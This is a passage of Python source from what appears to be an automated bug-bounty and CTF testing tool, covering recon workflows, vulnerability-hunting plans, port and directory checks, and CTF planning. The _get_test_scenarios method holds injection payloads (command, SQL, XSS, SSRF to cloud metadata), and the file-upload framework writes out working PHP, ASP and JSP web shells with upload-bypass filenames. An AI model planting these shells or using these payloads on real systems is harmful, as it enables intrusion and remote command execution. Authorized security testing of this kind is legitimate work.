        """Handle partial results and fill gaps with alternative methods"""
        
        enhanced_results = partial_results.copy()
        enhanced_results["degradation_info"] = {
            "operation": operation,
            "failed_components": failed_components,
            "partial_success": True,
            "fallback_applied": True,
            "timestamp": datetime.now().isoformat()
        }
        
        # Try to fill gaps based on operation type
        if operation == "network_discovery" and "open_ports" not in partial_results:
            # Try basic port check if full scan failed
            enhanced_results["open_ports"] = self._basic_port_check(partial_results.get("target"))
            
        elif operation == "web_discovery" and "directories" not in partial_results:
            # Try basic directory check
            enhanced_results["directories"] = self._basic_directory_check(partial_results.get("target"))
            
        elif operation == "vulnerability_scanning" and "vulnerabilities" not in partial_results:
            # Provide basic security headers check
            enhanced_results["vulnerabilities"] = self._basic_security_check(partial_results.get("target"))
        
        # Add recommendations for manual follow-up
        enhanced_results["manual_recommendations"] = self._get_manual_recommendations(
            operation, failed_components
        )
        
        logger.info(f"🛡️  Graceful degradation applied for {operation}")
        return enhanced_results
    
    def _basic_port_check(self, target: str) -> List[int]:
        """Basic port connectivity check"""
        if not target:
            return []
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except Exception:
                continue
        
        return open_ports
    
    def _basic_directory_check(self, target: str) -> List[str]:
        """Basic directory existence check"""
        if not target:
            return []
        
        common_dirs = ["/admin", "/login", "/api", "/wp-admin", "/phpmyadmin", "/robots.txt"]
        found_dirs = []
        
        for directory in common_dirs:
            try:
                url = f"{target.rstrip('/')}{directory}"
                response = requests.head(url, timeout=5, allow_redirects=True)
                if response.status_code in [200, 301, 302, 403]:
                    found_dirs.append(directory)
            except Exception:
                continue
        
        return found_dirs
    
    def _basic_security_check(self, target: str) -> List[Dict[str, Any]]:
        """Basic security headers check"""
        if not target:
            return []
        
        vulnerabilities = []
        
        try:
            response = requests.get(target, timeout=10)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                "X-Frame-Options": "Clickjacking protection missing",
                "X-Content-Type-Options": "MIME type sniffing protection missing",
                "X-XSS-Protection": "XSS protection missing",
                "Strict-Transport-Security": "HTTPS enforcement missing",
                "Content-Security-Policy": "Content Security Policy missing"
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        "type": "missing_security_header",
                        "severity": "medium",
                        "description": description,
                        "header": header
                    })
        
        except Exception as e:
            vulnerabilities.append({
                "type": "connection_error",
                "severity": "info",
                "description": f"Could not perform basic security check: {str(e)}"
            })
        
        return vulnerabilities
    
    def _get_manual_recommendations(self, operation: str, failed_components: List[str]) -> List[str]:
        """Get manual recommendations for failed operations"""
        recommendations = []
        
        base_recommendations = {
            "network_discovery": [
                "Manually test common ports using telnet or nc",
                "Check for service banners manually",
                "Use online port scanners as alternative"
            ],
            "web_discovery": [
                "Manually browse common directories",
                "Check robots.txt and sitemap.xml",
                "Use browser developer tools for endpoint discovery"
            ],
            "vulnerability_scanning": [
                "Manually test for common vulnerabilities",
                "Check security headers using browser tools",
                "Perform manual input validation testing"
            ],
            "subdomain_enumeration": [
                "Use online subdomain discovery tools",
                "Check certificate transparency logs",
                "Perform manual DNS queries"
            ]
        }
        
        recommendations.extend(base_recommendations.get(operation, []))
        
        # Add specific recommendations based on failed components
        for component in failed_components:
            if component == "nmap":
                recommendations.append("Consider using online port scanners")
            elif component == "gobuster":
                recommendations.append("Try manual directory browsing")
            elif component == "nuclei":
                recommendations.append("Perform manual vulnerability testing")
        
        return recommendations
    
    def is_critical_operation(self, operation: str) -> bool:
        """Check if operation is critical and requires fallback"""
        return operation in self.critical_operations

# Global error handler and degradation manager instances
error_handler = IntelligentErrorHandler()
degradation_manager = GracefulDegradation()

# ============================================================================
# BUG BOUNTY HUNTING SPECIALIZED WORKFLOWS (v6.0 ENHANCEMENT)
# ============================================================================

@dataclass
class BugBountyTarget:
    """Bug bounty target information"""
    domain: str
    scope: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    program_type: str = "web"  # web, api, mobile, iot
    priority_vulns: List[str] = field(default_factory=lambda: ["rce", "sqli", "xss", "idor", "ssrf"])
    bounty_range: str = "unknown"
    
class BugBountyWorkflowManager:
    """Specialized workflow manager for bug bounty hunting"""
    
    def __init__(self):
        self.high_impact_vulns = {
            "rce": {"priority": 10, "tools": ["nuclei", "jaeles", "sqlmap"], "payloads": "command_injection"},
            "sqli": {"priority": 9, "tools": ["sqlmap", "nuclei"], "payloads": "sql_injection"},
            "ssrf": {"priority": 8, "tools": ["nuclei", "ffuf"], "payloads": "ssrf"},
            "idor": {"priority": 8, "tools": ["arjun", "paramspider", "ffuf"], "payloads": "idor"},
            "xss": {"priority": 7, "tools": ["dalfox", "nuclei"], "payloads": "xss"},
            "lfi": {"priority": 7, "tools": ["ffuf", "nuclei"], "payloads": "lfi"},
            "xxe": {"priority": 6, "tools": ["nuclei"], "payloads": "xxe"},
            "csrf": {"priority": 5, "tools": ["nuclei"], "payloads": "csrf"}
        }
        
        self.reconnaissance_tools = [
            {"tool": "amass", "phase": "subdomain_enum", "priority": 1},
            {"tool": "subfinder", "phase": "subdomain_enum", "priority": 2},
            {"tool": "httpx", "phase": "http_probe", "priority": 3},
            {"tool": "katana", "phase": "crawling", "priority": 4},
            {"tool": "gau", "phase": "url_discovery", "priority": 5},
            {"tool": "waybackurls", "phase": "url_discovery", "priority": 6},
            {"tool": "paramspider", "phase": "parameter_discovery", "priority": 7},
            {"tool": "arjun", "phase": "parameter_discovery", "priority": 8}
        ]
    
    def create_reconnaissance_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create comprehensive reconnaissance workflow for bug bounty"""
        workflow = {
            "target": target.domain,
            "phases": [],
            "estimated_time": 0,
            "tools_count": 0
        }
        
        # Phase 1: Subdomain Discovery
        subdomain_phase = {
            "name": "subdomain_discovery",
            "description": "Comprehensive subdomain enumeration",
            "tools": [
                {"tool": "amass", "params": {"domain": target.domain, "mode": "enum"}},
                {"tool": "subfinder", "params": {"domain": target.domain, "silent": True}},
                {"tool": "assetfinder", "params": {"domain": target.domain}}
            ],
            "expected_outputs": ["subdomains.txt"],
            "estimated_time": 300
        }
        workflow["phases"].append(subdomain_phase)
        
        # Phase 2: HTTP Service Discovery
        http_phase = {
            "name": "http_service_discovery",
            "description": "Identify live HTTP services",
            "tools": [
                {"tool": "httpx", "params": {"probe": True, "tech_detect": True, "status_code": True}},
                {"tool": "nuclei", "params": {"tags": "tech", "severity": "info"}}
            ],
            "expected_outputs": ["live_hosts.txt", "technologies.json"],
            "estimated_time": 180
        }
        workflow["phases"].append(http_phase)
        
        # Phase 3: Content Discovery
        content_phase = {
            "name": "content_discovery",
            "description": "Discover hidden content and endpoints",
            "tools": [
                {"tool": "katana", "params": {"depth": 3, "js_crawl": True}},
                {"tool": "gau", "params": {"include_subs": True}},
                {"tool": "waybackurls", "params": {}},
                {"tool": "dirsearch", "params": {"extensions": "php,html,js,txt,json,xml"}}
            ],
            "expected_outputs": ["endpoints.txt", "js_files.txt"],
            "estimated_time": 600
        }
        workflow["phases"].append(content_phase)
        
        # Phase 4: Parameter Discovery
        param_phase = {
            "name": "parameter_discovery",
            "description": "Discover hidden parameters",
            "tools": [
                {"tool": "paramspider", "params": {"level": 2}},
                {"tool": "arjun", "params": {"method": "GET,POST", "stable": True}},
                {"tool": "x8", "params": {"method": "GET"}}
            ],
            "expected_outputs": ["parameters.txt"],
            "estimated_time": 240
        }
        workflow["phases"].append(param_phase)
        
        # Calculate totals
        workflow["estimated_time"] = sum(phase["estimated_time"] for phase in workflow["phases"])
        workflow["tools_count"] = sum(len(phase["tools"]) for phase in workflow["phases"])
        
        return workflow
    
    def create_vulnerability_hunting_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create vulnerability hunting workflow prioritized by impact"""
        workflow = {
            "target": target.domain,
            "vulnerability_tests": [],
            "estimated_time": 0,
            "priority_score": 0
        }
        
        # Sort vulnerabilities by priority
        sorted_vulns = sorted(target.priority_vulns, 
                            key=lambda v: self.high_impact_vulns.get(v, {}).get("priority", 0), 
                            reverse=True)
        
        for vuln_type in sorted_vulns:
            if vuln_type in self.high_impact_vulns:
                vuln_config = self.high_impact_vulns[vuln_type]
                
                vuln_test = {
                    "vulnerability_type": vuln_type,
                    "priority": vuln_config["priority"],
                    "tools": vuln_config["tools"],
                    "payload_type": vuln_config["payloads"],
                    "test_scenarios": self._get_test_scenarios(vuln_type),
                    "estimated_time": vuln_config["priority"] * 30  # Higher priority = more time
                }
                
                workflow["vulnerability_tests"].append(vuln_test)
                workflow["estimated_time"] += vuln_test["estimated_time"]
                workflow["priority_score"] += vuln_config["priority"]
        
        return workflow
    
    def _get_test_scenarios(self, vuln_type: str) -> List[Dict[str, Any]]:
        """Get specific test scenarios for vulnerability types"""
        scenarios = {
            "rce": [
                {"name": "Command Injection", "payloads": ["$(whoami)", "`id`", ";ls -la"]},
                {"name": "Code Injection", "payloads": ["<?php system($_GET['cmd']); ?>"]},
                {"name": "Template Injection", "payloads": ["{{7*7}}", "${7*7}", "#{7*7}"]}
            ],
            "sqli": [
                {"name": "Union-based SQLi", "payloads": ["' UNION SELECT 1,2,3--", "' OR 1=1--"]},
                {"name": "Boolean-based SQLi", "payloads": ["' AND 1=1--", "' AND 1=2--"]},
                {"name": "Time-based SQLi", "payloads": ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--"]}
            ],
            "xss": [
                {"name": "Reflected XSS", "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]},
                {"name": "Stored XSS", "payloads": ["<script>alert('XSS')</script>"]},
                {"name": "DOM XSS", "payloads": ["javascript:alert(1)", "#<script>alert(1)</script>"]}
            ],
            "ssrf": [
                {"name": "Internal Network", "payloads": ["http://127.0.0.1:80", "http://localhost:22"]},
                {"name": "Cloud Metadata", "payloads": ["http://169.254.169.254/latest/meta-data/"]},
                {"name": "DNS Exfiltration", "payloads": ["http://burpcollaborator.net"]}
            ],
            "idor": [
                {"name": "Numeric IDOR", "payloads": ["id=1", "id=2", "id=../1"]},
                {"name": "UUID IDOR", "payloads": ["uuid=00000000-0000-0000-0000-000000000001"]},
                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}  # base64 encoded 1,2
            ]
        }
        
        return scenarios.get(vuln_type, [])
    
    def create_business_logic_testing_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create business logic testing workflow"""
        workflow = {
            "target": target.domain,
            "business_logic_tests": [
                {
                    "category": "Authentication Bypass",
                    "tests": [
                        {"name": "Password Reset Token Reuse", "method": "manual"},
                        {"name": "JWT Algorithm Confusion", "method": "automated", "tool": "jwt_tool"},
                        {"name": "Session Fixation", "method": "manual"},
                        {"name": "OAuth Flow Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Authorization Flaws",
                    "tests": [
                        {"name": "Horizontal Privilege Escalation", "method": "automated", "tool": "arjun"},
                        {"name": "Vertical Privilege Escalation", "method": "manual"},
                        {"name": "Role-based Access Control Bypass", "method": "manual"}
                    ]
                },
                {
                    "category": "Business Process Manipulation",
                    "tests": [
                        {"name": "Race Conditions", "method": "automated", "tool": "race_the_web"},
                        {"name": "Price Manipulation", "method": "manual"},
                        {"name": "Quantity Limits Bypass", "method": "manual"},
                        {"name": "Workflow State Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Input Validation Bypass",
                    "tests": [
                        {"name": "File Upload Restrictions", "method": "automated", "tool": "upload_scanner"},
                        {"name": "Content-Type Bypass", "method": "manual"},
                        {"name": "Size Limit Bypass", "method": "manual"}
                    ]
                }
            ],
            "estimated_time": 480,  # 8 hours for thorough business logic testing
            "manual_testing_required": True
        }
        
        return workflow
    
    def create_osint_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create OSINT gathering workflow"""
        workflow = {
            "target": target.domain,
            "osint_phases": [
                {
                    "name": "Domain Intelligence",
                    "tools": [
                        {"tool": "whois", "params": {"domain": target.domain}},
                        {"tool": "dnsrecon", "params": {"domain": target.domain}},
                        {"tool": "certificate_transparency", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Social Media Intelligence",
                    "tools": [
                        {"tool": "sherlock", "params": {"username": "target_company"}},
                        {"tool": "social_mapper", "params": {"company": target.domain}},
                        {"tool": "linkedin_scraper", "params": {"company": target.domain}}
                    ]
                },
                {
                    "name": "Email Intelligence",
                    "tools": [
                        {"tool": "hunter_io", "params": {"domain": target.domain}},
                        {"tool": "haveibeenpwned", "params": {"domain": target.domain}},
                        {"tool": "email_validator", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Technology Intelligence",
                    "tools": [
                        {"tool": "builtwith", "params": {"domain": target.domain}},
                        {"tool": "wappalyzer", "params": {"domain": target.domain}},
                        {"tool": "shodan", "params": {"query": f"hostname:{target.domain}"}}
                    ]
                }
            ],
            "estimated_time": 240,
            "intelligence_types": ["technical", "social", "business", "infrastructure"]
        }
        
        return workflow

class FileUploadTestingFramework:
    """Specialized framework for file upload vulnerability testing"""
    
    def __init__(self):
        self.malicious_extensions = [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".asp", ".aspx", ".jsp", ".jspx",
            ".py", ".rb", ".pl", ".cgi",
            ".sh", ".bat", ".cmd", ".exe"
        ]
        
        self.bypass_techniques = [
            "double_extension",
            "null_byte",
            "content_type_spoofing",
            "magic_bytes",
            "case_variation",
            "special_characters"
        ]
    
    def generate_test_files(self) -> Dict[str, Any]:
        """Generate various test files for upload testing"""
        test_files = {
            "web_shells": [
                {"name": "simple_php_shell.php", "content": "<?php system($_GET['cmd']); ?>"},
                {"name": "asp_shell.asp", "content": "<%eval request(\"cmd\")%>"},
                {"name": "jsp_shell.jsp", "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"}
            ],
            "bypass_files": [
                {"name": "shell.php.txt", "technique": "double_extension"},
                {"name": "shell.php%00.txt", "technique": "null_byte"},
                {"name": "shell.PhP", "technique": "case_variation"},
                {"name": "shell.php.", "technique": "trailing_dot"}
            ],
            "polyglot_files": [
                {"name": "polyglot.jpg", "content": "GIF89a<?php system($_GET['cmd']); ?>", "technique": "image_polyglot"}
            ]
        }
        
        return test_files
    
    def create_upload_testing_workflow(self, target_url: str) -> Dict[str, Any]:
        """Create comprehensive file upload testing workflow"""
        workflow = {
            "target": target_url,
            "test_phases": [
                {
                    "name": "reconnaissance",
                    "description": "Identify upload endpoints",
                    "tools": ["katana", "gau", "paramspider"],
                    "expected_findings": ["upload_forms", "api_endpoints"]
                },
                {
                    "name": "baseline_testing",
                    "description": "Test legitimate file uploads",
                    "test_files": ["image.jpg", "document.pdf", "text.txt"],
                    "observations": ["response_codes", "file_locations", "naming_conventions"]
                },
                {
                    "name": "malicious_upload_testing",
                    "description": "Test malicious file uploads",
                    "test_files": self.generate_test_files(),
                    "bypass_techniques": self.bypass_techniques
                },
                {
                    "name": "post_upload_verification",
                    "description": "Verify uploaded files and test execution",
                    "actions": ["file_access_test", "execution_test", "path_traversal_test"]
                }
            ],
            "estimated_time": 360,
            "risk_level": "high"
        }
        
        return workflow

# Global bug bounty workflow manager
bugbounty_manager = BugBountyWorkflowManager()
fileupload_framework = FileUploadTestingFramework()

# ============================================================================
# CTF COMPETITION EXCELLENCE FRAMEWORK (v6.0 ENHANCEMENT)
# ============================================================================

@dataclass
class CTFChallenge:
    """CTF challenge information"""
    name: str
    category: str  # web, crypto, pwn, forensics, rev, misc, osint
    description: str
    points: int = 0
    difficulty: str = "unknown"  # easy, medium, hard, insane
    files: List[str] = field(default_factory=list)
    url: str = ""
    hints: List[str] = field(default_factory=list)

class CTFWorkflowManager:
    """Specialized workflow manager for CTF competitions"""
    
    def __init__(self):
        self.category_tools = {
            "web": {
                "reconnaissance": ["httpx", "katana", "gau", "waybackurls"],
                "vulnerability_scanning": ["nuclei", "dalfox", "sqlmap", "nikto"],
                "content_discovery": ["gobuster", "dirsearch", "feroxbuster"],
                "parameter_testing": ["arjun", "paramspider", "x8"],
                "specialized": ["wpscan", "joomscan", "droopescan"]
            },
            "crypto": {
                "hash_analysis": ["hashcat", "john", "hash-identifier"],
                "cipher_analysis": ["cipher-identifier", "cryptool", "cyberchef"],
                "rsa_attacks": ["rsatool", "factordb", "yafu"],
                "frequency_analysis": ["frequency-analysis", "substitution-solver"],
                "modern_crypto": ["sage", "pycrypto", "cryptography"]
            },
            "pwn": {
                "binary_analysis": ["checksec", "ghidra", "radare2", "gdb-peda"],
                "exploit_development": ["pwntools", "ropper", "one-gadget"],
                "heap_exploitation": ["glibc-heap-analysis", "heap-viewer"],
                "format_string": ["format-string-exploiter"],
                "rop_chains": ["ropgadget", "ropper", "angr"]
            },
            "forensics": {
                "file_analysis": ["file", "binwalk", "foremost", "photorec"],
                "image_forensics": ["exiftool", "steghide", "stegsolve", "zsteg"],
                "memory_forensics": ["volatility", "rekall"],
                "network_forensics": ["wireshark", "tcpdump", "networkminer"],
                "disk_forensics": ["autopsy", "sleuthkit", "testdisk"]
            },
            "rev": {
                "disassemblers": ["ghidra", "ida", "radare2", "binary-ninja"],
                "debuggers": ["gdb", "x64dbg", "ollydbg"],
                "decompilers": ["ghidra", "hex-rays", "retdec"],
                "packers": ["upx", "peid", "detect-it-easy"],
                "analysis": ["strings", "ltrace", "strace", "objdump"]
            },
            "misc": {
                "encoding": ["base64", "hex", "url-decode", "rot13"],
                "compression": ["zip", "tar", "gzip", "7zip"],
                "qr_codes": ["qr-decoder", "zbar"],
                "audio_analysis": ["audacity", "sonic-visualizer"],
                "esoteric": ["brainfuck", "whitespace", "piet"]
            },
            "osint": {
                "search_engines": ["google-dorking", "shodan", "censys"],
                "social_media": ["sherlock", "social-analyzer"],
                "image_analysis": ["reverse-image-search", "exif-analysis"],
                "domain_analysis": ["whois", "dns-analysis", "certificate-transparency"],
                "geolocation": ["geoint", "osm-analysis", "satellite-imagery"]
            }
        }
        
        self.solving_strategies = {
            "web": [
                {"strategy": "source_code_analysis", "description": "Analyze HTML/JS source for hidden information"},
                {"strategy": "directory_traversal", "description": "Test for path traversal vulnerabilities"},
                {"strategy": "sql_injection", "description": "Test for SQL injection in all parameters"},
                {"strategy": "xss_exploitation", "description": "Test for XSS and exploit for admin access"},
                {"strategy": "authentication_bypass", "description": "Test for auth bypass techniques"},
                {"strategy": "session_manipulation", "description": "Analyze and manipulate session tokens"},
                {"strategy": "file_upload_bypass", "description": "Test file upload restrictions and bypasses"}
            ],
            "crypto": [
                {"strategy": "frequency_analysis", "description": "Perform frequency analysis for substitution ciphers"},
                {"strategy": "known_plaintext", "description": "Use known plaintext attacks"},
                {"strategy": "weak_keys", "description": "Test for weak cryptographic keys"},
                {"strategy": "implementation_flaws", "description": "Look for implementation vulnerabilities"},
                {"strategy": "side_channel", "description": "Exploit timing or other side channels"},
                {"strategy": "mathematical_attacks", "description": "Use mathematical properties to break crypto"}
            ],
            "pwn": [
                {"strategy": "buffer_overflow", "description": "Exploit buffer overflow vulnerabilities"},
                {"strategy": "format_string", "description": "Exploit format string vulnerabilities"},
                {"strategy": "rop_chains", "description": "Build ROP chains for exploitation"},
                {"strategy": "heap_exploitation", "description": "Exploit heap-based vulnerabilities"},
                {"strategy": "race_conditions", "description": "Exploit race condition vulnerabilities"},
                {"strategy": "integer_overflow", "description": "Exploit integer overflow conditions"}
            ],
            "forensics": [
                {"strategy": "file_carving", "description": "Recover deleted or hidden files"},
                {"strategy": "metadata_analysis", "description": "Analyze file metadata for hidden information"},
                {"strategy": "steganography", "description": "Extract hidden data from images/audio"},
                {"strategy": "memory_analysis", "description": "Analyze memory dumps for artifacts"},
                {"strategy": "network_analysis", "description": "Analyze network traffic for suspicious activity"},
                {"strategy": "timeline_analysis", "description": "Reconstruct timeline of events"}
            ],
            "rev": [
                {"strategy": "static_analysis", "description": "Analyze binary without execution"},
                {"strategy": "dynamic_analysis", "description": "Analyze binary during execution"},
                {"strategy": "anti_debugging", "description": "Bypass anti-debugging techniques"},
                {"strategy": "unpacking", "description": "Unpack packed/obfuscated binaries"},
                {"strategy": "algorithm_recovery", "description": "Reverse engineer algorithms"},
                {"strategy": "key_recovery", "description": "Extract encryption keys from binaries"}
            ]
        }
    
    def create_ctf_challenge_workflow(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Create advanced specialized workflow for CTF challenge with AI-powered optimization"""
        workflow = {
            "challenge": challenge.name,
            "category": challenge.category,
            "difficulty": challenge.difficulty,
            "points": challenge.points,
            "tools": [],
            "strategies": [],
            "estimated_time": 0,
            "success_probability": 0.0,
            "automation_level": "high",
            "parallel_tasks": [],
            "dependencies": [],
            "fallback_strategies": [],
            "resource_requirements": {},
            "expected_artifacts": [],
            "validation_steps": []
        }
        
        # Enhanced tool selection using CTFToolManager
        ctf_tool_manager = CTFToolManager()
        workflow["tools"] = ctf_tool_manager.suggest_tools_for_challenge(challenge.description, challenge.category)
        
        # Get category-specific strategies with enhanced intelligence
        if challenge.category in self.solving_strategies:
            workflow["strategies"] = self.solving_strategies[challenge.category]
            # Add fallback strategies for robustness
            workflow["fallback_strategies"] = self._generate_fallback_strategies(challenge.category)
        
        # Advanced time estimation with machine learning-like scoring
        base_times = {
            "easy": {"min": 15, "avg": 30, "max": 60},
            "medium": {"min": 30, "avg": 60, "max": 120},
            "hard": {"min": 60, "avg": 120, "max": 240},
            "insane": {"min": 120, "avg": 240, "max": 480},
            "unknown": {"min": 45, "avg": 90, "max": 180}
        }
        
        # Factor in category complexity
        category_multipliers = {
            "web": 1.0,
            "crypto": 1.3,
            "pwn": 1.5,
            "forensics": 1.2,
            "rev": 1.4,
            "misc": 0.8,
            "osint": 0.9
        }
        
        base_time = base_times[challenge.difficulty]["avg"]
        category_mult = category_multipliers.get(challenge.category, 1.0)
        
        # Adjust based on description complexity
        description_complexity = self._analyze_description_complexity(challenge.description)
        complexity_mult = 1.0 + (description_complexity * 0.3)
        
        workflow["estimated_time"] = int(base_time * category_mult * complexity_mult * 60)  # Convert to seconds
        
        # Enhanced success probability calculation
        base_success = {
            "easy": 0.85,
            "medium": 0.65,
            "hard": 0.45,
            "insane": 0.25,
            "unknown": 0.55
        }[challenge.difficulty]
        
        # Adjust based on tool availability and category expertise
        tool_availability_bonus = min(0.15, len(workflow["tools"]) * 0.02)
        workflow["success_probability"] = min(0.95, base_success + tool_availability_bonus)
        
        # Add advanced workflow components
        workflow["workflow_steps"] = self._create_advanced_category_workflow(challenge)
        workflow["parallel_tasks"] = self._identify_parallel_tasks(challenge.category)
        workflow["resource_requirements"] = self._calculate_resource_requirements(challenge)
        workflow["expected_artifacts"] = self._predict_expected_artifacts(challenge)
        workflow["validation_steps"] = self._create_validation_steps(challenge.category)
        
        return workflow
    
    def _select_tools_for_challenge(self, challenge: CTFChallenge, category_tools: Dict[str, List[str]]) -> List[str]:
        """Select appropriate tools based on challenge details"""
        selected_tools = []
        
        # Always include reconnaissance tools for the category
        if "reconnaissance" in category_tools:
            selected_tools.extend(category_tools["reconnaissance"][:2])  # Top 2 recon tools
        
        # Add specialized tools based on challenge description
        description_lower = challenge.description.lower()
        
        if challenge.category == "web":
            if any(keyword in description_lower for keyword in ["sql", "injection", "database"]):
                selected_tools.append("sqlmap")
            if any(keyword in description_lower for keyword in ["xss", "script", "javascript"]):
                selected_tools.append("dalfox")
            if any(keyword in description_lower for keyword in ["wordpress", "wp"]):
                selected_tools.append("wpscan")
            if any(keyword in description_lower for keyword in ["upload", "file"]):
                selected_tools.extend(["gobuster", "feroxbuster"])
        
        elif challenge.category == "crypto":
            if any(keyword in description_lower for keyword in ["hash", "md5", "sha"]):
                selected_tools.extend(["hashcat", "john"])
            if any(keyword in description_lower for keyword in ["rsa", "public key"]):
                selected_tools.extend(["rsatool", "factordb"])
            if any(keyword in description_lower for keyword in ["cipher", "encrypt"]):
                selected_tools.extend(["cipher-identifier", "cyberchef"])
        
        elif challenge.category == "pwn":
            selected_tools.extend(["checksec", "ghidra", "pwntools"])
            if any(keyword in description_lower for keyword in ["heap", "malloc"]):
                selected_tools.append("glibc-heap-analysis")
            if any(keyword in description_lower for keyword in ["format", "printf"]):
                selected_tools.append("format-string-exploiter")
        
        elif challenge.category == "forensics":
            if any(keyword in description_lower for keyword in ["image", "jpg", "png"]):
                selected_tools.extend(["exiftool", "steghide", "stegsolve"])
            if any(keyword in description_lower for keyword in ["memory", "dump"]):
                selected_tools.append("volatility")
            if any(keyword in description_lower for keyword in ["network", "pcap"]):
                selected_tools.extend(["wireshark", "tcpdump"])
        
        elif challenge.category == "rev":
            selected_tools.extend(["ghidra", "radare2", "strings"])
            if any(keyword in description_lower for keyword in ["packed", "upx"]):
                selected_tools.extend(["upx", "peid"])
        
        # Remove duplicates while preserving order
        return list(dict.fromkeys(selected_tools))
    
    def _create_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
        """Create category-specific workflow steps"""
        workflows = {
            "web": [
                {"step": 1, "action": "reconnaissance", "description": "Analyze target URL and gather information"},
                {"step": 2, "action": "source_analysis", "description": "Examine HTML/JS source code for clues"},
                {"step": 3, "action": "directory_discovery", "description": "Discover hidden directories and files"},
                {"step": 4, "action": "vulnerability_testing", "description": "Test for common web vulnerabilities"},
                {"step": 5, "action": "exploitation", "description": "Exploit discovered vulnerabilities"},
                {"step": 6, "action": "flag_extraction", "description": "Extract flag from compromised system"}
            ],
            "crypto": [
                {"step": 1, "action": "cipher_identification", "description": "Identify the type of cipher or encoding"},
                {"step": 2, "action": "key_analysis", "description": "Analyze key properties and weaknesses"},
                {"step": 3, "action": "attack_selection", "description": "Select appropriate cryptographic attack"},
                {"step": 4, "action": "implementation", "description": "Implement and execute the attack"},
                {"step": 5, "action": "verification", "description": "Verify the decrypted result"},
                {"step": 6, "action": "flag_extraction", "description": "Extract flag from decrypted data"}
            ],
            "pwn": [
                {"step": 1, "action": "binary_analysis", "description": "Analyze binary protections and architecture"},
                {"step": 2, "action": "vulnerability_discovery", "description": "Find exploitable vulnerabilities"},
                {"step": 3, "action": "exploit_development", "description": "Develop exploit payload"},
                {"step": 4, "action": "local_testing", "description": "Test exploit locally"},
                {"step": 5, "action": "remote_exploitation", "description": "Execute exploit against remote target"},
                {"step": 6, "action": "shell_interaction", "description": "Interact with gained shell to find flag"}
            ],
            "forensics": [
                {"step": 1, "action": "file_analysis", "description": "Analyze provided files and their properties"},
                {"step": 2, "action": "data_recovery", "description": "Recover deleted or hidden data"},
                {"step": 3, "action": "artifact_extraction", "description": "Extract relevant artifacts and evidence"},
                {"step": 4, "action": "timeline_reconstruction", "description": "Reconstruct timeline of events"},
                {"step": 5, "action": "correlation_analysis", "description": "Correlate findings across different sources"},
                {"step": 6, "action": "flag_discovery", "description": "Locate flag in recovered data"}
            ],
            "rev": [
                {"step": 1, "action": "static_analysis", "description": "Perform static analysis of the binary"},
                {"step": 2, "action": "dynamic_analysis", "description": "Run binary and observe behavior"},
                {"step": 3, "action": "algorithm_identification", "description": "Identify key algorithms and logic"},
                {"step": 4, "action": "key_extraction", "description": "Extract keys or important values"},
                {"step": 5, "action": "solution_implementation", "description": "Implement solution based on analysis"},
                {"step": 6, "action": "flag_generation", "description": "Generate or extract the flag"}
            ]
        }
        
        return workflows.get(challenge.category, [
            {"step": 1, "action": "analysis", "description": "Analyze the challenge"},
            {"step": 2, "action": "research", "description": "Research relevant techniques"},
            {"step": 3, "action": "implementation", "description": "Implement solution"},
            {"step": 4, "action": "testing", "description": "Test the solution"},
            {"step": 5, "action": "refinement", "description": "Refine approach if needed"},
            {"step": 6, "action": "flag_submission", "description": "Submit the flag"}
        ])
    
    def create_ctf_team_strategy(self, challenges: List[CTFChallenge], team_size: int = 4) -> Dict[str, Any]:
        """Create team strategy for CTF competition"""
        strategy = {
            "team_size": team_size,
            "challenge_allocation": {},
            "priority_order": [],
            "estimated_total_time": 0,
            "expected_score": 0
        }
        
        # Sort challenges by points/time ratio for optimal strategy
        challenge_efficiency = []
        for challenge in challenges:
            workflow = self.create_ctf_challenge_workflow(challenge)
            efficiency = (challenge.points * workflow["success_probability"]) / (workflow["estimated_time"] / 3600)  # points per hour
            challenge_efficiency.append({
                "challenge": challenge,
                "efficiency": efficiency,
                "workflow": workflow
            })
        
        # Sort by efficiency (highest first)
        challenge_efficiency.sort(key=lambda x: x["efficiency"], reverse=True)
        
        # Allocate challenges to team members
        team_workload = [0] * team_size
        for i, item in enumerate(challenge_efficiency):
            # Assign to team member with least workload
            team_member = team_workload.index(min(team_workload))
            
            if team_member not in strategy["challenge_allocation"]:
                strategy["challenge_allocation"][team_member] = []
            
            strategy["challenge_allocation"][team_member].append({
                "challenge": item["challenge"].name,
                "category": item["challenge"].category,
                "points": item["challenge"].points,
                "estimated_time": item["workflow"]["estimated_time"],
                "success_probability": item["workflow"]["success_probability"]
            })
            
            team_workload[team_member] += item["workflow"]["estimated_time"]
            strategy["expected_score"] += item["challenge"].points * item["workflow"]["success_probability"]
        
        strategy["estimated_total_time"] = max(team_workload)
        strategy["priority_order"] = [item["challenge"].name for item in challenge_efficiency]
        
        return strategy
    
    def _generate_fallback_strategies(self, category: str) -> List[Dict[str, str]]:
        """Generate fallback strategies for when primary approaches fail"""
        fallback_strategies = {
            "web": [
                {"strategy": "manual_source_review", "description": "Manually review all source code and comments"},
                {"strategy": "alternative_wordlists", "description": "Try alternative wordlists and fuzzing techniques"},
                {"strategy": "parameter_pollution", "description": "Test for HTTP parameter pollution vulnerabilities"},
                {"strategy": "race_conditions", "description": "Test for race condition vulnerabilities"},
